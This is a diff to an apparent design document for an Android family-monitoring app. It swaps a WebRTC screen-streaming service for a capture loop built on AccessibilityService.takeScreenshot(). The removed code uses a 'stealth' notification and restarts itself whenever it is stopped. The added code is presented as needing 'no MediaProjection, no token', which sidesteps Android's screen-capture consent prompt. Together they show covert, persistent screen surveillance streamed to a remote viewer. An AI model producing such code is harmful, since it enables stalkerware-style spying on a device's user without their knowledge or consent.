@@ -184,178 +184,57 @@ class WebRTCManager @Inject constructor(
 
 ## Child App — Screen Capture + Stream
 
+SCREEN CAPTURE APPROACH — AccessibilityService.takeScreenshot()
+
 ```kotlin
-@AndroidEntryPoint
-class ScreenCaptureService : Service() {
+// How the child app captures screen frames — no MediaProjection, no token needed
+// Runs inside the existing AppMonitorService (which is already an AccessibilityService)
+// or a dedicated GuardianAccessibilityService
 
-    @Inject lateinit var webRTCManager: WebRTCManager
-    @Inject lateinit var signalingClient: SignalingClient
-
-    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
-    private var mediaProjection: MediaProjection? = null
-    private var videoCapturer: ScreenCapturerAndroid? = null
-    private var localVideoTrack: VideoTrack? = null
-    private var peerConnection: PeerConnection? = null
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(NOTIFICATION_ID, buildStealthNotification())
-
-        // MediaProjection data comes from setup wizard result
-        val resultCode = intent?.getIntExtra("result_code", Activity.RESULT_CANCELED)
-            ?: return START_STICKY
-        val data = intent.getParcelableExtra<Intent>("projection_data")
-            ?: return START_STICKY
-
-        initializeWebRTC(resultCode, data)
-        connectToSignaling()
-        return START_STICKY
-    }
-
-    private fun initializeWebRTC(resultCode: Int, data: Intent) {
-        webRTCManager.initialize()
-
-        // ScreenCapturerAndroid uses MediaProjection to capture screen frames
-        videoCapturer = ScreenCapturerAndroid(data, object : MediaProjection.Callback() {
-            override fun onStop() {
-                // MediaProjection stopped — restart capture
-                scheduleRestart()
-            }
-        })
-
-        val surfaceTextureHelper = SurfaceTextureHelper.create(
-            "CaptureThread",
-            webRTCManager.getEglBase().eglBaseContext
-        )
-
-        val videoSource = webRTCManager.createVideoSource(isScreencast = true)
-        videoCapturer?.initialize(surfaceTextureHelper, applicationContext, videoSource.capturerObserver)
-
-        // Adaptive resolution based on network quality
-        val (width, height, fps) = getQualityForNetwork()
-        videoCapturer?.startCapture(width, height, fps)
-
-        localVideoTrack = webRTCManager.createVideoTrack("screen_track", videoSource)
-
-        peerConnection = webRTCManager.createPeerConnection(peerConnectionObserver)
-        peerConnection?.addTrack(localVideoTrack!!, listOf("stream_id"))
-    }
-
-    private fun getQualityForNetwork(): Triple<Int, Int, Int> {
-        return when (getCurrentNetworkType()) {
-            NetworkType.NR   -> Triple(1080, 1920, 20)
-            NetworkType.WIFI -> Triple(720,  1280, 15)
-            NetworkType.LTE  -> Triple(540,  960,  12)
-            NetworkType.UMTS -> Triple(360,  640,  10)
-            NetworkType.EDGE -> Triple(240,  426,  8)
-        }
-    }
-
-    private fun connectToSignaling() {
-        serviceScope.launch {
-            signalingClient.connect()
-            signalingClient.joinRoom(familyId = getFamilyId(), role = "child")
-
-            // When parent joins, create and send offer
-            signalingClient.onPeerJoined = {
-                createAndSendOffer()
-            }
-
-            signalingClient.onAnswerReceived = { sdp ->
-                val sessionDescription = SessionDescription(
-                    SessionDescription.Type.ANSWER, sdp
-                )
-                peerConnection?.setRemoteDescription(SimpleSdpObserver(), sessionDescription)
-            }
-
-            signalingClient.onIceCandidateReceived = { candidate ->
-                peerConnection?.addIceCandidate(
-                    IceCandidate(candidate.sdpMid, candidate.sdpMLineIndex, candidate.sdp)
-                )
-            }
-        }
-    }
-
-    private fun createAndSendOffer() {
-        val constraints = MediaConstraints().apply {
-            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"))
-        }
-        peerConnection?.createOffer(object : SimpleSdpObserver() {
-            override fun onCreateSuccess(sdp: SessionDescription) {
-                peerConnection?.setLocalDescription(SimpleSdpObserver(), sdp)
-                signalingClient.sendOffer(getFamilyId(), sdp.description)
-            }
-        }, constraints)
-    }
-
-    private val peerConnectionObserver = object : PeerConnection.Observer {
-        override fun onIceCandidate(candidate: IceCandidate) {
-            signalingClient.sendIceCandidate(getFamilyId(), candidate)
-        }
-        override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
-            if (state == PeerConnection.IceConnectionState.DISCONNECTED ||
-                state == PeerConnection.IceConnectionState.FAILED) {
-                // Auto-reconnect within 3 seconds as per project spec
-                serviceScope.launch {
-                    delay(3000)
-                    reconnect()
+// Step 1: Call takeScreenshot() on a coroutine-safe loop
+fun startScreenCapture(onFrame: (Bitmap) -> Unit) {
+    // Requires API 30+ — check before calling
+    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return
+    
+    CoroutineScope(Dispatchers.Default).launch {
+        while (isCapturing) {
+            takeScreenshot(
+                Display.DEFAULT_DISPLAY,
+                mainExecutor,
+                object : TakeScreenshotCallback {
+                    override fun onSuccess(result: ScreenshotResult) {
+                        val bitmap = Bitmap.wrapHardwareBuffer(
+                            result.hardwareBuffer, 
+                            result.colorSpace
+                        ) ?: return
+                        onFrame(bitmap)
+                        result.hardwareBuffer.close()
+                    }
+                    override fun onFailure(errorCode: Int) { /* log and retry */ }
                 }
-            }
+            )
+            delay(frameIntervalMs) // 100ms = ~10fps, 67ms = ~15fps
         }
-        // Implement remaining required overrides with empty bodies
-        override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
-        override fun onIceConnectionReceivingChange(receiving: Boolean) {}
-        override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
-        override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
-        override fun onAddStream(stream: MediaStream?) {}
-        override fun onRemoveStream(stream: MediaStream?) {}
-        override fun onDataChannel(channel: DataChannel?) {}
-        override fun onRenegotiationNeeded() {}
-        override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
-    }
-
-    // Adaptive quality — reduce quality on slow networks
-    fun adaptBitrate(networkType: NetworkType) {
-        val bitrate = when (networkType) {
-            NetworkType.NR   -> 1_500_000  // 1500kbps on 5G
-            NetworkType.WIFI -> 800_000    // 800kbps on WiFi
-            NetworkType.LTE  -> 500_000    // 500kbps on 4G
-            NetworkType.UMTS -> 200_000    // 200kbps on 3G
-            NetworkType.EDGE -> 100_000    // 100kbps on 2G
-        }
-        val parameters = peerConnection
-            ?.senders
-            ?.firstOrNull()
-            ?.parameters
-            ?: return
-
-        parameters.encodings.firstOrNull()?.maxBitrateBps = bitrate
-        peerConnection?.senders?.firstOrNull()?.parameters = parameters
-    }
-
-    override fun onTaskRemoved(rootIntent: Intent?) {
-        super.onTaskRemoved(rootIntent)
-        scheduleRestart()
-    }
-
-    override fun onDestroy() {
-        videoCapturer?.stopCapture()
-        videoCapturer?.dispose()
-        localVideoTrack?.dispose()
-        webRTCManager.dispose()
-        signalingClient.disconnect()
-        serviceScope.cancel()
-        scheduleRestart() // always restart — screen capture must survive
-        super.onDestroy()
-    }
-
-    override fun onBind(intent: Intent?): IBinder? = null
-
-    companion object {
-        // Resolution and FPS are now dynamic based on network — see getQualityForNetwork()
-        const val NOTIFICATION_ID = 1001
     }
 }
+
+// Step 2: Convert bitmap to ByteArray for WebRTC
+fun bitmapToJpegBytes(bitmap: Bitmap, quality: Int = 70): ByteArray {
+    val stream = ByteArrayOutputStream()
+    bitmap.compress(Bitmap.CompressFormat.JPEG, quality, stream)
+    return stream.toByteArray()
+}
+
+// Step 3: Push into WebRTC custom VideoSource
+// Create a custom VideoCapturer that calls takeScreenshot() in a loop
+// and pushes NV21 or I420 frames into the WebRTC pipeline via CapturerObserver
 ```
+
+Adaptive frame rate based on network:
+- 5G/WiFi: 15fps (67ms interval), quality 80
+- 4G: 12fps (83ms interval), quality 65
+- 3G: 8fps (125ms interval), quality 50
+- 2G: 5fps (200ms interval), quality 35
 
 ---
 
